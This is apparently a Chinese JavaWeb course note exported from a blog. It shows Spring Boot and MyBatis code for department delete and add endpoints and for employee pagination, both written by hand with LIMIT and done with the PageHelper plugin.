Controller层@DeleteMapping(&quot;/depts/&#123;id&#125;&quot;)public Result delete(@PathVariable Integer id)&#123;    log.info(&quot;根据id删除部门:&#123;&#125;&quot;,id);    service.delete(id);    return Result.success();&#125;



Service层@Overridepublic void delete(Integer id) &#123;    mapper.deleteById(id);&#125;



Mapper层@Delete(&quot;delete from dept where id=#&#123;id&#125;&quot;)void deleteById(Integer id);

postman测试
执行结果

部门管理-新增接口文档

Controller层@PostMapping(&quot;/depts&quot;)public Result add(@RequestBody Dept dept)&#123;    log.info(&quot;新增部门&#123;&#125;&quot;,dept);    service.add(dept);    return Result.success();&#125;



Service层@Overridepublic void add(Dept dept)&#123;    dept.setCreateTime(LocalDate.now());    dept.setUpdateTime(LocalDate.now());    mapper.insert(dept);&#125;



Mapper层@Insert(&quot;insert into dept (name,create_time,update_time) values (#&#123;name&#125;,#&#123;createTime&#125;,#&#123;updateTime&#125;)&quot;)void insert(Dept dept);



postman测试
结果

简化RequestMapping

员工管理分页查询分析
接口文档




封装实体类
@Data@NoArgsConstructor@AllArgsConstructorpublic class pageBean &#123;        private Long total;        private List rows;&#125;

实现Mapper层@Mapperpublic interface EmpMapper &#123;        /**         * 查询总记录数         * @return         */        @Select(&quot;select count(*) from emp&quot;)         Long count();        /**         *         * @param page:起始页         * @param pageSize:查多少页         * @return         */        @Select(&quot;select * from emp limit #&#123;page&#125;,#&#123;pageSize&#125;&quot;)         List&lt;Emp&gt; page(Integer page,Integer pageSize);&#125;

Service层@Servicepublic class empImpl implements empService &#123;        @Autowired        EmpMapper empMapper;        @Override        public PageBean page(Integer page, Integer pageSize) &#123;                Long total = empMapper.count();                Integer start = (page - 1) * pageSize;                List&lt;Emp&gt; rows = empMapper.page(start, pageSize);                //封装pageBean                PageBean pageBean = new PageBean(total,rows);                return pageBean;        &#125;&#125;



Controller层
用@RequestParam(defaultValue&#x3D;””)设置参数默认值
@RestControllerpublic class empController &#123;        @GetMapping(&quot;/emps&quot;)        public Result page(@RequestParam(defaultValue = &quot;1&quot;) Integer page, @RequestParam(defaultValue = &quot;10&quot;) Integer pageSize)&#123;                return new Result();        &#125;&#125;

日志输出
log.info(&quot;分页查询,分页查询页码为&#123;&#125;,每页记录数为&#123;&#125;&quot;,page,pageSize);

调用Service层
PageBean pageBean = empservice.page(page,pageSize);

@Slf4j@RestControllerpublic class empController &#123;        @Autowired        empService empservice;        @GetMapping(&quot;/emps&quot;)        public Result page(@RequestParam(defaultValue = &quot;1&quot;) Integer page, @RequestParam(defaultValue = &quot;10&quot;) Integer pageSize)&#123;                log.info(&quot;分页查询,起始&#123;&#125;,查询&#123;&#125;页&quot;,page,pageSize);//                调用service层                PageBean pageBean = empservice.page(page,pageSize);                return Result.success(pageBean);        &#125;&#125;

测试postman

前后端联调

PageHelper插件
引入依赖
这里的版本不能按照课件的1.4.2，否则会强转异常(ClassCastException)
&lt;dependency&gt;    &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt;    &lt;artifactId&gt;pagehelper-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;1.4.6&lt;/version&gt;&lt;/dependency&gt;

EmpMapper
@Select(&quot;select* from emp&quot;)List&lt;Emp&gt; list();

EmpServer的实现类
@Overridepublic PageBean page(Integer page, Integer pageSize) &#123;    //设置分页参数    PageHelper.startPage(page,pageSize);    //执行查询    List&lt;Emp&gt; empList = empMapper.list();    Page&lt;Emp&gt; page1 = (Page&lt;Emp&gt;)empList;    //封装bean对象    PageBean pageBean = new PageBean(page1.getTotal(),page1.getResult());    return pageBean;&#125;

]]></content>
      <categories>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
</search>
